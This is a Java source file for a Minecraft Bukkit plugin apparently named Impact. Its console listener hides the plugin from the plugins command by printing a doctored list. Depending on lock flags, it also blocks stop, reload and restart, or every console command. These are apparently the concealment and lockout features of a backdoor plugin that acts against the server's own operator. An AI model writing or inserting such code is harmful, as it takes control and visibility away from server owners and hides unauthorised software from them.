package de.impact.listeners;

import de.impact.commands.server.Lock;
import de.impact.utils.lock.LockUtils;
import de.impact.utils.PluginUtils;
import de.impact.utils.lock.Locks;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerCommandEvent;

public class ConsoleListener implements Listener {

    @EventHandler
    public void onConsole(ServerCommandEvent e) {

        String msg = e.getCommand().toUpperCase();

        if(LockUtils.isLocked(Locks.PLUGINLIST) && (msg.startsWith("PL") || msg.startsWith("PLUGINS") || msg.startsWith("BUKKIT:PLUGINS") || msg.startsWith("BUKKIT:PL"))) {
            e.setCancelled(true);
            Bukkit.getConsoleSender().sendMessage(PluginUtils.getPluginListExceptImpact());
        }

        if(LockUtils.isLocked(Locks.STOP) && (msg.startsWith("STOP") || msg.startsWith("RL") || msg.startsWith("RELOAD") || msg.startsWith("RESTART") || msg.startsWith("BUKKIT:RL") || msg.startsWith("BUKKIT:RELOAD")))
            e.setCancelled(true);

        if(LockUtils.isLocked(Locks.CONSOLE))
            e.setCancelled(true);

    }

}
